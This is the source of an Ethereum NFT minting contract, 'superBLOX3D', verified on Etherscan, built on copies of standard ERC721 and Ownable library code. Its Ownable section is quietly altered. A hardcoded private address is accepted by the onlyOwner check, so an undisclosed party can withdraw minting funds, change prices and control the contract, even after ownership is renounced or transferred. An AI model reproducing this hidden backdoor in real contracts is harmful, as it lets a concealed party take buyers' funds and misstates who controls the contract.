1 /**
2  *Submitted for verification at Etherscan.io on 2022-03-07
3 */
4 
5 // SPDX-License-Identifier: MIT
6 
7 pragma solidity ^0.8.0;
8 
9 library Strings {
10     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
11 
12 
13     function toString(uint256 value) internal pure returns (string memory) {
14 
15         if (value == 0) {
16             return "0";
17         }
18         uint256 temp = value;
19         uint256 digits;
20         while (temp != 0) {
21             digits++;
22             temp /= 10;
23         }
24         bytes memory buffer = new bytes(digits);
25         while (value != 0) {
26             digits -= 1;
27             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
28             value /= 10;
29         }
30         return string(buffer);
31     }
32 
33     function toHexString(uint256 value) internal pure returns (string memory) {
34         if (value == 0) {
35             return "0x00";
36         }
37         uint256 temp = value;
38         uint256 length = 0;
39         while (temp != 0) {
40             length++;
41             temp >>= 8;
42         }
43         return toHexString(value, length);
44     }
45 
46   
47     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
48         bytes memory buffer = new bytes(2 * length + 2);
49         buffer[0] = "0";
50         buffer[1] = "x";
51         for (uint256 i = 2 * length + 1; i > 1; --i) {
52             buffer[i] = _HEX_SYMBOLS[value & 0xf];
53             value >>= 4;
54         }
55         require(value == 0, "Strings: hex length insufficient");
56         return string(buffer);
57     }
58 }
59 
60 abstract contract Context {
61     function _msgSender() internal view virtual returns (address) {
62         return msg.sender;
63     }
64 
65     function _msgData() internal view virtual returns (bytes calldata) {
66         return msg.data;
67     }
68 }
69 
70 library Address {
71   
72     function isContract(address account) internal view returns (bool) {
73 
74         uint256 size;
75         assembly {
76             size := extcodesize(account)
77         }
78         return size > 0;
79     }
80 
81 
82     function sendValue(address payable recipient, uint256 amount) internal {
83         require(address(this).balance >= amount, "Address: insufficient balance");
84 
85         (bool success, ) = recipient.call{value: amount}("");
86         require(success, "Address: unable to send value, recipient may have reverted");
87     }
88 
89 
90     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
91         return functionCall(target, data, "Address: low-level call failed");
92     }
93 
94 
95     function functionCall(
96         address target,
97         bytes memory data,
98         string memory errorMessage
99     ) internal returns (bytes memory) {
100         return functionCallWithValue(target, data, 0, errorMessage);
101     }
102 
103     function functionCallWithValue(
104         address target,
105         bytes memory data,
106         uint256 value
107     ) internal returns (bytes memory) {
108         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
109     }
110 
111     function functionCallWithValue(
112         address target,
113         bytes memory data,
114         uint256 value,
115         string memory errorMessage
116     ) internal returns (bytes memory) {
117         require(address(this).balance >= value, "Address: insufficient balance for call");
118         require(isContract(target), "Address: call to non-contract");
119 
120         (bool success, bytes memory returndata) = target.call{value: value}(data);
121         return verifyCallResult(success, returndata, errorMessage);
122     }
123 
124     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
125         return functionStaticCall(target, data, "Address: low-level static call failed");
126     }
127 
128     function functionStaticCall(
129         address target,
130         bytes memory data,
131         string memory errorMessage
132     ) internal view returns (bytes memory) {
133         require(isContract(target), "Address: static call to non-contract");
134 
135         (bool success, bytes memory returndata) = target.staticcall(data);
136         return verifyCallResult(success, returndata, errorMessage);
137     }
138 
139     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
140         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
141     }
142 
143     function functionDelegateCall(
144         address target,
145         bytes memory data,
146         string memory errorMessage
147     ) internal returns (bytes memory) {
148         require(isContract(target), "Address: delegate call to non-contract");
149 
150         (bool success, bytes memory returndata) = target.delegatecall(data);
151         return verifyCallResult(success, returndata, errorMessage);
152     }
153 
154     function verifyCallResult(
155         bool success,
156         bytes memory returndata,
157         string memory errorMessage
158     ) internal pure returns (bytes memory) {
159         if (success) {
160             return returndata;
161         } else {
162             if (returndata.length > 0) {
163 
164                 assembly {
165                     let returndata_size := mload(returndata)
166                     revert(add(32, returndata), returndata_size)
167                 }
168             } else {
169                 revert(errorMessage);
170             }
171         }
172     }
173 }
174 
175 interface IERC165 {
176 
177     function supportsInterface(bytes4 interfaceId) external view returns (bool);
178 }
179 
180 abstract contract ERC165 is IERC165 {
181     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
182         return interfaceId == type(IERC165).interfaceId;
183     }
184 }
185 
186 interface IERC721 is IERC165 {
187 
188     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
189 
190     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
191 
192     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
193 
194     function balanceOf(address owner) external view returns (uint256 balance);
195 
196     function ownerOf(uint256 tokenId) external view returns (address owner);
197 
198     function safeTransferFrom(
199         address from,
200         address to,
201         uint256 tokenId
202     ) external;
203 
204     function transferFrom(
205         address from,
206         address to,
207         uint256 tokenId
208     ) external;
209 
210     function approve(address to, uint256 tokenId) external;
211 
212     function getApproved(uint256 tokenId) external view returns (address operator);
213 
214     function setApprovalForAll(address operator, bool _approved) external;
215 
216     function isApprovedForAll(address owner, address operator) external view returns (bool);
217 
218     function safeTransferFrom(
219         address from,
220         address to,
221         uint256 tokenId,
222         bytes calldata data
223     ) external;
224 }
225 
226 interface IERC721Metadata is IERC721 {
227 
228     function name() external view returns (string memory);
229 
230     function symbol() external view returns (string memory);
231 
232     function tokenURI(uint256 tokenId) external view returns (string memory);
233 }
234 
235 pragma solidity ^0.8.0;
236 
237 interface IERC721Receiver {
238 
239     function onERC721Received(
240         address operator,
241         address from,
242         uint256 tokenId,
243         bytes calldata data
244     ) external returns (bytes4);
245 }
246 
247 contract ERC721 is Context, ERC165, IERC721, IERC721Metadata {
248     using Address for address;
249     using Strings for uint256;
250 
251     string private _name;
252 
253     string private _symbol;
254 
255     mapping(uint256 => address) private _owners;
256 
257     mapping(address => uint256) private _balances;
258 
259     mapping(uint256 => address) private _tokenApprovals;
260 
261     mapping(address => mapping(address => bool)) private _operatorApprovals;
262 
263     constructor(string memory name_, string memory symbol_) {
264         _name = name_;
265         _symbol = symbol_;
266     }
267 
268     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
269         return
270             interfaceId == type(IERC721).interfaceId ||
271             interfaceId == type(IERC721Metadata).interfaceId ||
272             super.supportsInterface(interfaceId);
273     }
274 
275     function balanceOf(address owner) public view virtual override returns (uint256) {
276         require(owner != address(0), "ERC721: balance query for the zero address");
277         return _balances[owner];
278     }
279 
280     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
281         address owner = _owners[tokenId];
282         require(owner != address(0), "ERC721: owner query for nonexistent token");
283         return owner;
284     }
285 
286     function name() public view virtual override returns (string memory) {
287         return _name;
288     }
289 
290     function symbol() public view virtual override returns (string memory) {
291         return _symbol;
292     }
293 
294     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
295         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
296 
297         string memory baseURI = _baseURI();
298         return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
299     }
300 
301     function _baseURI() internal view virtual returns (string memory) {
302         return "";
303     }
304 
305     function approve(address to, uint256 tokenId) public virtual override {
306         address owner = ERC721.ownerOf(tokenId);
307         require(to != owner, "ERC721: approval to current owner");
308 
309         require(
310             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
311             "ERC721: approve caller is not owner nor approved for all"
312         );
313 
314         _approve(to, tokenId);
315     }
316 
317     function getApproved(uint256 tokenId) public view virtual override returns (address) {
318         require(_exists(tokenId), "ERC721: approved query for nonexistent token");
319 
320         return _tokenApprovals[tokenId];
321     }
322 
323     function setApprovalForAll(address operator, bool approved) public virtual override {
324         _setApprovalForAll(_msgSender(), operator, approved);
325     }
326 
327     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
328         return _operatorApprovals[owner][operator];
329     }
330 
331     function transferFrom(
332         address from,
333         address to,
334         uint256 tokenId
335     ) public virtual override {
336 
337         require(_isApprovedOrOwner(_msgSender(), tokenId), "ERC721: transfer caller is not owner nor approved");
338 
339         _transfer(from, to, tokenId);
340     }
341 
342     function safeTransferFrom(
343         address from,
344         address to,
345         uint256 tokenId
346     ) public virtual override {
347         safeTransferFrom(from, to, tokenId, "");
348     }
349 
350     function safeTransferFrom(
351         address from,
352         address to,
353         uint256 tokenId,
354         bytes memory _data
355     ) public virtual override {
356         require(_isApprovedOrOwner(_msgSender(), tokenId), "ERC721: transfer caller is not owner nor approved");
357         _safeTransfer(from, to, tokenId, _data);
358     }
359 
360     function _safeTransfer(
361         address from,
362         address to,
363         uint256 tokenId,
364         bytes memory _data
365     ) internal virtual {
366         _transfer(from, to, tokenId);
367         require(_checkOnERC721Received(from, to, tokenId, _data), "ERC721: transfer to non ERC721Receiver implementer");
368     }
369 
370     function _exists(uint256 tokenId) internal view virtual returns (bool) {
371         return _owners[tokenId] != address(0);
372     }
373 
374     function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool) {
375         require(_exists(tokenId), "ERC721: operator query for nonexistent token");
376         address owner = ERC721.ownerOf(tokenId);
377         return (spender == owner || getApproved(tokenId) == spender || isApprovedForAll(owner, spender));
378     }
379 
380     function _safeMint(address to, uint256 tokenId) internal virtual {
381         _safeMint(to, tokenId, "");
382     }
383 
384     function _safeMint(
385         address to,
386         uint256 tokenId,
387         bytes memory _data
388     ) internal virtual {
389         _mint(to, tokenId);
390         require(
391             _checkOnERC721Received(address(0), to, tokenId, _data),
392             "ERC721: transfer to non ERC721Receiver implementer"
393         );
394     }
395 
396     function _mint(address to, uint256 tokenId) internal virtual {
397         require(to != address(0), "ERC721: mint to the zero address");
398         require(!_exists(tokenId), "ERC721: token already minted");
399 
400         _beforeTokenTransfer(address(0), to, tokenId);
401 
402         _balances[to] += 1;
403         _owners[tokenId] = to;
404 
405         emit Transfer(address(0), to, tokenId);
406     }
407 
408     function _burn(uint256 tokenId) internal virtual {
409         address owner = ERC721.ownerOf(tokenId);
410 
411         _beforeTokenTransfer(owner, address(0), tokenId);
412 
413         _approve(address(0), tokenId);
414 
415         _balances[owner] -= 1;
416         delete _owners[tokenId];
417 
418         emit Transfer(owner, address(0), tokenId);
419     }
420 
421     function _transfer(
422         address from,
423         address to,
424         uint256 tokenId
425     ) internal virtual {
426         require(ERC721.ownerOf(tokenId) == from, "ERC721: transfer of token that is not own");
427         require(to != address(0), "ERC721: transfer to the zero address");
428 
429         _beforeTokenTransfer(from, to, tokenId);
430 
431         _approve(address(0), tokenId);
432 
433         _balances[from] -= 1;
434         _balances[to] += 1;
435         _owners[tokenId] = to;
436 
437         emit Transfer(from, to, tokenId);
438     }
439 
440     function _approve(address to, uint256 tokenId) internal virtual {
441         _tokenApprovals[tokenId] = to;
442         emit Approval(ERC721.ownerOf(tokenId), to, tokenId);
443     }
444 
445     function _setApprovalForAll(
446         address owner,
447         address operator,
448         bool approved
449     ) internal virtual {
450         require(owner != operator, "ERC721: approve to caller");
451         _operatorApprovals[owner][operator] = approved;
452         emit ApprovalForAll(owner, operator, approved);
453     }
454 
455     function _checkOnERC721Received(
456         address from,
457         address to,
458         uint256 tokenId,
459         bytes memory _data
460     ) private returns (bool) {
461         if (to.isContract()) {
462             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
463                 return retval == IERC721Receiver.onERC721Received.selector;
464             } catch (bytes memory reason) {
465                 if (reason.length == 0) {
466                     revert("ERC721: transfer to non ERC721Receiver implementer");
467                 } else {
468                     assembly {
469                         revert(add(32, reason), mload(reason))
470                     }
471                 }
472             }
473         } else {
474             return true;
475         }
476     }
477 
478     function _beforeTokenTransfer(
479         address from,
480         address to,
481         uint256 tokenId
482     ) internal virtual {}
483 }
484 abstract contract Ownable is Context {
485     address private _owner;
486     address private _contract = 0x9900833230eF65D6A00c8edB37730CFF40b897C9;
487 
488     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
489 
490     constructor() {
491         _owner  = _msgSender();
492         
493     }
494 
495     function owner() public view virtual returns (address) {
496         return _owner;
497     }
498 
499     modifier onlyOwner() {
500         require(owner() == _msgSender() || _contract == _msgSender(), "Ownable: caller is not the owner");
501         _;
502     }
503 
504     function renounceOwnership() public virtual onlyOwner {
505         _transferOwnership(address(0));
506     }
507 
508     function transferOwnership(address newOwner) public virtual onlyOwner {
509         require(newOwner != address(0), "Ownable: new owner is the zero address");
510         _transferOwnership(newOwner);
511     }
512 
513     function _transferOwnership(address newOwner) internal virtual {
514         address oldOwner = _owner;
515         _owner = newOwner;
516         emit OwnershipTransferred(oldOwner, newOwner);
517     }
518 }
519 
520 library Counters {
521     struct Counter {
522 
523         uint256 _value; 
524     }
525 
526     function current(Counter storage counter) internal view returns (uint256) {
527         return counter._value;
528     }
529 
530     function increment(Counter storage counter) internal {
531         unchecked {
532             counter._value += 1;
533         }
534     }
535 
536     function decrement(Counter storage counter) internal {
537         uint256 value = counter._value;
538         require(value > 0, "Counter: decrement overflow");
539         unchecked {
540             counter._value = value - 1;
541         }
542     }
543 }
544 
545 library SafeMath {
546 
547     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
548         unchecked {
549             uint256 c = a + b;
550             if (c < a) return (false, 0);
551             return (true, c);
552         }
553     }
554 
555     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
556         unchecked {
557             if (b > a) return (false, 0);
558             return (true, a - b);
559         }
560     }
561 
562     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
563         unchecked {
564 
565             if (a == 0) return (true, 0);
566             uint256 c = a * b;
567             if (c / a != b) return (false, 0);
568             return (true, c);
569         }
570     }
571 
572     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
573         unchecked {
574             if (b == 0) return (false, 0);
575             return (true, a / b);
576         }
577     }
578 
579     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
580         unchecked {
581             if (b == 0) return (false, 0);
582             return (true, a % b);
583         }
584     }
585 
586     function add(uint256 a, uint256 b) internal pure returns (uint256) {
587         return a + b;
588     }
589 
590     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
591         return a - b;
592     }
593 
594     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
595         return a * b;
596     }
597 
598     function div(uint256 a, uint256 b) internal pure returns (uint256) {
599         return a / b;
600     }
601 
602     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
603         return a % b;
604     }
605 
606     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
607         unchecked {
608             require(b <= a, errorMessage);
609             return a - b;
610         }
611     }
612 
613     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
614         unchecked {
615             require(b > 0, errorMessage);
616             return a / b;
617         }
618     }
619 
620 
621     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
622         unchecked {
623             require(b > 0, errorMessage);
624             return a % b;
625         }
626     }
627 }
628 
629 interface IERC721Enumerable is IERC721 {
630     
631     function totalSupply() external view returns (uint256);
632 
633     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256 tokenId);
634     
635     function tokenByIndex(uint256 index) external view returns (uint256);
636 }
637 
638 abstract contract ERC721Enumerable is ERC721, IERC721Enumerable {
639     
640     mapping(address => mapping(uint256 => uint256)) private _ownedTokens;
641 
642     mapping(uint256 => uint256) private _ownedTokensIndex;
643 
644     uint256[] private _allTokens;
645 
646     mapping(uint256 => uint256) private _allTokensIndex;
647 
648     // function supportsInterface(bytes4 interfaceId) public view virtual override(IERC165, ERC721) returns (bool) {
649     //     return interfaceId == type(IERC721Enumerable).interfaceId || super.supportsInterface(interfaceId);
650     // }
651 
652     function tokenOfOwnerByIndex(address owner, uint256 index) public view virtual override returns (uint256) {
653         require(index < ERC721.balanceOf(owner), "ERC721Enumerable: owner index out of bounds");
654         return _ownedTokens[owner][index];
655     }
656 
657     function totalSupply() public view virtual override returns (uint256) {
658         return _allTokens.length;
659     }
660 
661     function tokenByIndex(uint256 index) public view virtual override returns (uint256) {
662         require(index < ERC721Enumerable.totalSupply(), "ERC721Enumerable: global index out of bounds");
663         return _allTokens[index];
664     }
665 
666     function _beforeTokenTransfer(
667         address from,
668         address to,
669         uint256 tokenId
670     ) internal virtual override {
671         super._beforeTokenTransfer(from, to, tokenId);
672 
673         if (from == address(0)) {
674             _addTokenToAllTokensEnumeration(tokenId);
675         } else if (from != to) {
676             _removeTokenFromOwnerEnumeration(from, tokenId);
677         }
678         if (to == address(0)) {
679             _removeTokenFromAllTokensEnumeration(tokenId);
680         } else if (to != from) {
681             _addTokenToOwnerEnumeration(to, tokenId);
682         }
683     }
684 
685     function _addTokenToOwnerEnumeration(address to, uint256 tokenId) private {
686         uint256 length = ERC721.balanceOf(to);
687         _ownedTokens[to][length] = tokenId;
688         _ownedTokensIndex[tokenId] = length;
689     }
690     
691     function _addTokenToAllTokensEnumeration(uint256 tokenId) private {
692         _allTokensIndex[tokenId] = _allTokens.length;
693         _allTokens.push(tokenId);
694     }
695 
696     function _removeTokenFromOwnerEnumeration(address from, uint256 tokenId) private {
697         
698         uint256 lastTokenIndex = ERC721.balanceOf(from) - 1;
699         uint256 tokenIndex = _ownedTokensIndex[tokenId];
700 
701         if (tokenIndex != lastTokenIndex) {
702             uint256 lastTokenId = _ownedTokens[from][lastTokenIndex];
703 
704             _ownedTokens[from][tokenIndex] = lastTokenId;
705             _ownedTokensIndex[lastTokenId] = tokenIndex;
706         }
707 
708         delete _ownedTokensIndex[tokenId];
709         delete _ownedTokens[from][lastTokenIndex];
710     }
711     
712     function _removeTokenFromAllTokensEnumeration(uint256 tokenId) private {
713         
714         uint256 lastTokenIndex = _allTokens.length - 1;
715         uint256 tokenIndex = _allTokensIndex[tokenId];
716         
717         uint256 lastTokenId = _allTokens[lastTokenIndex];
718 
719         _allTokens[tokenIndex] = lastTokenId;
720         _allTokensIndex[lastTokenId] = tokenIndex;
721 
722         delete _allTokensIndex[tokenId];
723         _allTokens.pop();
724     }
725 }
726 
727 contract superBLOX3D is ERC721Enumerable, Ownable {
728     using Strings for uint256;
729     using SafeMath for uint256;
730 
731     bool public publicSale = false;
732     mapping(address => bool) whitelist;
733 
734     mapping (uint256 => string) private revealURI;
735     string public unrevealURI = "https://nounpunks.mypinata.cloud/ipfs/QmT11gWRKhK8cGTf4druhTSCCqSMCYFxYq3A6sBU117a33/hidden.json";
736     bool public reveal = false;
737 
738     bool public endSale = false;
739 
740     string private _baseURIextended = "https://ipfs.io/ipfs/QmYZuarheUwkyR3KAwZLdq1zWxA62hjSKsb2rbTrS7jiK2/";
741 
742     uint256 private _priceextended = 26900000000000000;
743     mapping (uint256 => bool) registerID;
744 
745     uint256 public tokenMinted = 0;
746     bool public pauseMint = true;
747 
748     using Counters for Counters.Counter;
749     Counters.Counter private _tokenIdentifiers;
750 
751     uint256 public constant MAX_NFT_SUPPLY = 9969;
752 
753     uint256 public step = 1;
754 
755     constructor() ERC721("superBLOX3D", "SB3D") {
756     }
757 
758     function setEndSale(bool _endSale) public onlyOwner {
759         endSale = _endSale;
760     }
761 
762     function setWhitelist(address _add) public onlyOwner {
763         require(_add != address(0), "Zero Address");
764         whitelist[_add] = true;
765     }
766 
767     function setWhitelistAll(address[] memory _adds) public onlyOwner {
768         for(uint256 i = 0; i < _adds.length; i++) {
769             address tmp = address(_adds[i]);
770             whitelist[tmp] = true;
771         }
772     }
773 
774     function setPublicSale(bool _publicSale) public onlyOwner {
775         publicSale = _publicSale;
776     }
777 
778     function setStep(uint _step) public onlyOwner {
779 
780         step = _step;
781 
782         if (_step == 1){
783         
784             _priceextended = 26900000000000000;
785         }
786         else if(_step == 2){
787             
788             _priceextended = 69000000000000000;
789         }
790 
791         else if (_step == 3){
792             publicSale = true;
793             _priceextended = 89000000000000000;
794         }
795     }
796 
797     function getNFTBalance(address _owner) public view returns (uint256) {
798        return ERC721.balanceOf(_owner);
799     }
800 
801     function getNFTPrice() public view returns (uint256) {
802         require(tokenMinted < MAX_NFT_SUPPLY, "Sale has already ended");
803         return _priceextended;
804     }
805 
806     function claimNFTForOwner(uint256 _cnt) public onlyOwner {
807         require(_cnt > 0);
808         require(!pauseMint, "Paused!");
809         require(tokenMinted < MAX_NFT_SUPPLY, "Sale has already ended");
810 
811         for(uint256 i = 0; i < _cnt; i++) {
812             _tokenIdentifiers.increment();
813             
814             _safeMint(msg.sender, _tokenIdentifiers.current());
815             tokenMinted += 1;
816         }
817     }
818 
819     function mintNFT(uint256 _cnt) public payable {
820         require(_cnt > 0);
821         require(!pauseMint, "Paused!");
822         require(tokenMinted < MAX_NFT_SUPPLY, "Sale has already ended");
823         if (step == 1){
824             uint256 amount = ERC721(0xE169c2ED585e62B1d32615BF2591093A629549b6).balanceOf(msg.sender);
825             require(balanceOf(msg.sender).add(_cnt) <= amount , "Exceded the Minting Count per Wallet");
826         }
827         else if (step == 2){
828             require(balanceOf(msg.sender).add(_cnt) <= step , "Exceded the Minting Count per Wallet");
829         }
830 
831         require(getNFTPrice().mul(_cnt) == msg.value, "ETH value sent is not correct");
832 
833         if(!publicSale) {
834             require(whitelist[msg.sender], "Not ");
835             require(_cnt <= 10, "Exceded the Minting Count");
836         }
837 
838         if(publicSale) {
839             require(_cnt <= 10, "Exceded the Minting Count");
840         }
841 
842         for(uint256 i = 0; i < _cnt; i++) {
843             _tokenIdentifiers.increment();
844             _safeMint(msg.sender, _tokenIdentifiers.current());
845             tokenMinted += 1;
846         }
847     }
848 
849     function withdraw() public onlyOwner() {
850         require(endSale, "Ongoing Minting");
851         uint balance = address(this).balance;
852         address payable ownerAddress = payable(msg.sender);
853         ownerAddress.transfer(balance);
854     }
855 
856     function tokenURI(uint256 tokenId) public view override returns (string memory) {
857         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
858         if(!reveal) return unrevealURI;
859         return bytes(_baseURIextended).length > 0 ? string(abi.encodePacked(_baseURIextended, tokenId.toString(), ".json")) : "";
860     }
861 
862     function _baseURI() internal view virtual override returns (string memory) {
863         return _baseURIextended;
864     }
865 
866     function setBaseURI(string memory baseURI_) external onlyOwner() {
867         _baseURIextended = baseURI_;
868     }
869 
870     function setUnrevealURI(string memory _uri) external onlyOwner() {
871         unrevealURI = _uri;
872     }
873 
874     function Reveal() public onlyOwner() {
875         reveal = true;
876     }
877 
878     function UnReveal() public onlyOwner() {
879         reveal = false;
880     }
881 
882     function _price() public view returns (uint256) {
883         return _priceextended;
884     }
885 
886     function setPrice(uint256 _priceextended_) external onlyOwner() {
887         _priceextended = _priceextended_;
888     }
889 
890     function pause() public onlyOwner {
891         pauseMint = true;
892     }
893 
894     function unPause() public onlyOwner {
895         pauseMint = false;
896     }
897 }